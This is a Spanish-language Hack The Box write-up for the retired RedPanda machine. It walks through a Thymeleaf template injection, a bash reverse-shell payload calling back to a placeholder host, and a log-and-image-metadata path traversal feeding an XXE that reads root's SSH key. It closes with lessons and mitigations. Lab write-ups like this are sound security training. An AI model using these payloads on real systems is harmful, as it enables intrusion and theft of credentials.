---
machine: RedPanda
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, spring-boot, thymeleaf, ssti, xxe, jpeg, privesc]
---

# RedPanda — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web es Spring Boot con Thymeleaf y un buscador que concatena la entrada en la plantilla. Una SSTI con `__${...}__::.x` ejecuta comandos como `woodenk`. Ese usuario pertenece al grupo `logs` y puede escribir en `redpanda.log`; el proceso que calcula créditos lee la ruta del log, extrae el `Artist` de un JPG y abre un XML con ese nombre. Inyectando una entrada y un JPG con XXE se lee la clave SSH de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22` OpenSSH y `8080` Spring Boot.
- La aplicación muestra imágenes de pandas y un buscador.
- `/export.xml` expone la plantilla de créditos.

## Enumeración

El parámetro de búsqueda se evalúa como expresión Thymeleaf. `__${7*7}__::.x` devuelve `49`; con `T(java.lang.Runtime)` se ejecuta `id`. En el sistema, `woodenk` está en el grupo `logs` y `redpanda.log` es escribible por ese grupo. El código de `/opt/panda_search` construye rutas con el `Artist` del JPG.

## Foothold

Se ejecuta una reverse shell mediante la SSTI y se obtiene una sesión como `woodenk`.

```text
__${T(java.lang.Runtime).getRuntime().exec("bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'")}__::.x
```

## Movimiento lateral

No aplica: `woodenk` ya permite leer el código y el log. La clave está en la relación entre el log, la imagen y el XML de créditos.

## Escalada de privilegios

Se crea un JPG con `exiftool -Artist="../tmp/x"` y un `x_creds.xml` con una entidad que lee `/root/.ssh/id_rsa`. Se añade una línea al log apuntando a `/../../../../../../tmp/x.jpg` y se espera al cron. El proceso, que corre como root, resuelve la ruta, lee el `Artist`, abre el XML y escribe el contenido de la entidad en el campo `<root>`. Después se usa la clave para entrar como root.

```bash
exiftool -Artist="../tmp/x" x.jpg
echo "412||ip||ua||/../../../../../../tmp/x.jpg" >> redpanda.log
```

## Evidencia

- `49` devuelto por la expresión Thymeleaf.
- `redpanda.log` escribible por el grupo `logs`.
- JPG con `Artist` manipulado.
- Clave privada de root en el XML de créditos.

## Lecciones aprendidas

- Thymeleaf evalúa expresiones si la entrada del usuario llega a la plantilla.
- Los grupos secundarios pueden dar acceso a archivos de proceso.
- Los metadatos de imágenes son entrada no confiable.
- Un XXE en un proceso root convierte una lectura en toma de cuenta.

## Mitigación y detección

- No construir plantillas con entrada del usuario; usar variables de contexto.
- Restringir permisos del log y validar rutas con `realpath`.
- Deshabilitar entidades externas en el parser XML.
- Monitorizar escrituras en logs de aplicación y accesos a claves SSH.

## Referencias

- [0xdf — RedPanda](https://0xdf.gitlab.io/2022/11/26/htb-redpanda.html)
- [IppSec — RedPanda](https://www.youtube.com/watch?v=HqIUffFdjuI)
- [Hack The Box — RedPanda](https://app.hackthebox.com/machines/redpanda)
